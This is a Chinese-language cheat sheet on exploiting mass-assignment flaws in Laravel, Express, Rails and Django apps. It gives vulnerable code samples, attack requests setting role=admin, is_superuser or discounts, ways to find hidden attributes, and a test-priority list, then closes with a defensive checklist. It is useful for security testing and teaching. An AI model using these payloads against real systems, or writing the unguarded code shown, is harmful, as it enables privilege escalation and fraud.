# 批量赋值(Mass Assignment)绕过秘笈

## 批量赋值原理和利用

### 直接属性覆盖
```php
// 漏洞代码
$user = new User();
$user->fill($_POST);  // 直接赋值所有POST数据

// POST内容：
// name=john&role=admin&is_verified=1

// 结果：$user的所有属性都被覆盖
// 包括不应该由用户控制的role, is_verified等
```

### 参数名猜测
```javascript
// Node.js/Express中的批量赋值
const user = new User(req.body);

// 攻击者尝试常见的隐藏参数：
// role, admin, is_premium, is_verified, discount_level等

// POST:
// email=hacker@test.com&role=admin&is_verified=true&discount=0.99
```

## ORM框架特定漏洞

### Rails Protected Attributes漏洞
```ruby
# 漏洞代码
@user = User.new(params[:user])
# params[:user]可能包含隐藏属性

# 即使在Model中定义了attr_accessible
# 也可能通过其他方式绕过（如修改关键字参数名）
```

### Django QueryDict提取
```python
# 漏洞：直接使用request.POST
user = User.objects.create(**request.POST.dict())

# 攻击者可添加is_staff=true, is_superuser=true等
```

### Laravel Mass Assignment
```php
// 如果Model未定义$fillable或$guarded
class User extends Model {
    // 缺少：protected $fillable = ['name', 'email'];
}

// 可批量赋值所有属性
$user = User::create(request()->all());
```

## 隐藏属性发现

### 应用逻辑推断
```
分析应用功能，推断隐藏属性：

用户管理系统可能有：
- role（角色）
- is_admin（管理员标志）
- is_verified（邮箱验证）
- is_premium（高级会员）
- discount（折扣）
- created_at, updated_at（时间戳）
```

### 通过错误消息泄露
```
某些应用在验证失败时暴露属性：

"Unknown attribute: role"  // 说明role属性存在
"Validation failed on: is_verified"
```

### 通过源代码发现
```
检查：
1. 开源项目的源代码
2. GitHub上的示例项目
3. 应用的API文档
4. 前端代码中的隐藏字段
```

## 嵌套关系赋值

### HasOne/BelongsTo关系污染
```php
// 用户模型关联地址模型
$user->address()->create(request()->all());

// 攻击者可能添加address_id, user_id等外键
// 将自己的地址赋值给其他用户
```

### 多态关系滥用
```php
// 如果使用了多态关系
$comment = new Comment(request()->all());
// 可修改commentable_type和commentable_id
// 将评论关联到任意模型
```

## 时间戳和元数据修改

### 修改created_at
```
通过批量赋值修改：
- created_at: 假冒老账户
- updated_at: 伪造最后修改时间
- deleted_at: 软删除标记

结果：伪造账户历史
```

### 访问控制标志
```
修改以下属性获得高权限：
- is_admin: true
- role: 'administrator'
- permissions: ['admin', 'super_user']
- groups: ['admins']
```

## 关联表注入

### 多对多关系污染
```php
// 用户和角色的关联
$user->roles()->sync(request()->input('roles'));

// 攻击者可在roles中添加高权限角色ID
POST: roles[]=1&roles[]=999  // 999是admin角色
```

### 通过关系修改上级资源
```php
// 评论关联文章，文章属于用户
$comment = Comment::find($id);
$comment->update(request()->all());

// 攻击者可修改：
// article_id: 修改评论关联的文章
// user_id: 修改评论作者
```

## JSON和嵌套数据结构

### 深层嵌套属性赋值
```json
// 请求体
{
  "name": "John",
  "profile": {
    "bio": "Hacker",
    "role": "admin"
  },
  "settings": {
    "is_premium": true,
    "discount": 0.99
  }
}

// 某些ORM支持嵌套赋值，可能不充分过滤
```

### 数组和多值字段
```
phone_numbers[]=1234567890&phone_numbers[]=admin
email_addresses[]=user@test.com&email_addresses[]=admin@test.com

# 可能通过数组注入来改变预期的单值字段
```

## 快速定位和利用

**关键词识别**：
- $model->fill()或create()
- **request.body或**params
- 缺少$fillable或$guarded
- 没有输入验证或白名单

**常见隐藏属性**：
- role, is_admin, is_staff
- is_verified, is_active, is_banned
- is_premium, discount, balance
- created_at, updated_at, deleted_at
- user_id, owner_id（用于关联污染）

**测试优先级**：
1. 尝试添加role=admin
2. 尝试is_verified=true
3. 枚举常见属性
4. 测试嵌套属性(profile.role等)
5. 尝试关联表污染

## 防御检查清单

- ✓ 明确定义$fillable或$guarded白名单
- ✓ 仅允许必要的属性可被用户修改
- ✓ 管理员标志和权限绝不应在白名单中
- ✓ 使用专用DTO(Data Transfer Object)类
- ✓ 验证并清理所有输入
- ✓ 关键属性修改需额外授权
- ✓ 嵌套属性赋值需特别谨慎
- ✓ 定期审计可批量赋值的属性
- ✓ 日志记录所有属性修改
